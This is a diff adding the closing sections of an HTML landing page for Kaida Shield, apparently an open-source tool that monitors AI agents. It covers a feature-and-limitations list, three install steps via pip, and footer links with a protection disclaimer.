+                <div class="emoji">📝</div>
+                <h4>WordPress Bot</h4>
+                <p>mysite.com only</p>
+                <span class="status">Protected</span>
+            </div>
+        </div>
+    </div>
+</section>
+<!-- HONEST SECTION -->
+<section class="catches">
+    <div class="container">
+        <div class="section-label">Transparency</div>
+        <h2>What Kaida does — and doesn't do</h2>
+        <p class="section-desc">
+            We believe in honesty. Here's exactly where Kaida protects you today, and what's still on the roadmap.
+        </p>
+        <div class="honest-grid">
+            <div class="honest-col">
+                <h3><span style="color: var(--cyan);">✓</span> Works today</h3>
+                <ul class="honest-list yes">
+                    <li>Freezes bots accessing unauthorized websites</li>
+                    <li>Catches unauthorized file read/write attempts</li>
+                    <li>Detects phishing URLs and brand impersonation</li>
+                    <li>Blocks reverse shells, crypto miners, malicious commands</li>
+                    <li>Catches prompt injection attempts</li>
+                    <li>Detects bots stuck in loops</li>
+                    <li>Alerts on excessive API calls and token burn</li>
+                    <li>Alerts on activity spikes</li>
+                    <li>Notifies when bots go idle</li>
+                    <li>Natural language policy creation — no coding needed</li>
+                    <li>Works on Windows, Linux, and macOS</li>
+                    <li>Works with any agent framework</li>
+                </ul>
+            </div>
+            <div class="honest-col">
+                <h3><span style="color: var(--text-muted);">→</span> Coming soon</h3>
+                <ul class="honest-list no">
+                    <li>Cannot see inside encrypted traffic (sees destinations, not content)</li>
+                    <li>Cannot monitor what the AI model is "thinking"</li>
+                    <li>macOS-specific deep monitoring (in development)</li>
+                    <li>One-click installer for non-technical users</li>
+                    <li>Web-based dashboard (currently local only)</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</section>
+<!-- CTA -->
+<section class="cta-section">
+    <div class="container">
+        <h2>Start protecting your bots<br>in 30 seconds</h2>
+        <p class="section-desc" style="margin: 16px auto 0; text-align: center;">
+            Free. No account needed. No credit card. Just install and run.
+        </p>
+        <div class="cta-install-steps">
+            <div class="cta-step">
+                <div class="num">Step 1</div>
+                <div class="cmd">pip install kaida-shield</div>
+                <p>Install the package</p>
+            </div>
+            <div class="cta-step">
+                <div class="num">Step 2</div>
+                <div class="cmd">kaida ui</div>
+                <p>Open the dashboard</p>
+            </div>
+            <div class="cta-step">
+                <div class="num">Step 3</div>
+                <div class="cmd">Describe your bot</div>
+                <p>Kaida generates the rules</p>
+            </div>
+        </div>
+        <div style="margin-top: 40px;">
+            <a href="https://pypi.org/project/kaida-shield/" class="btn-primary" target="_blank" style="font-size: 17px; padding: 16px 40px;">
+                Install Kaida Shield Free →
+            </a>
+        </div>
+        <p style="margin-top: 20px; font-size: 13px; color: var(--text-muted);">
+            Works with OpenClaw, LangChain, CrewAI, AutoGPT, and any Python-based agent.
+        </p>
+    </div>
+</section>
+<!-- FOOTER -->
+<footer>
+    <div class="footer-links">
+        <a href="https://github.com/ajpandit775/kaida-shield" target="_blank">GitHub</a>
+        <a href="https://pypi.org/project/kaida-shield/" target="_blank">PyPI</a>
+        <a href="https://github.com/ajpandit775/kaida-shield/issues" target="_blank">Report a Bug</a>
+        <a href="https://github.com/ajpandit775/kaida-shield/discussions" target="_blank">Discussions</a>
+    </div>
+    <p>Kaida Shield v0.2.0 · Apache 2.0 · Free forever</p>
+    <p style="margin-top: 8px; font-size: 12px;">
+        Kaida Shield reduces risk but does not guarantee complete protection. No security tool can prevent all attacks.
+    </p>
+</footer>
+</body>
+</html>
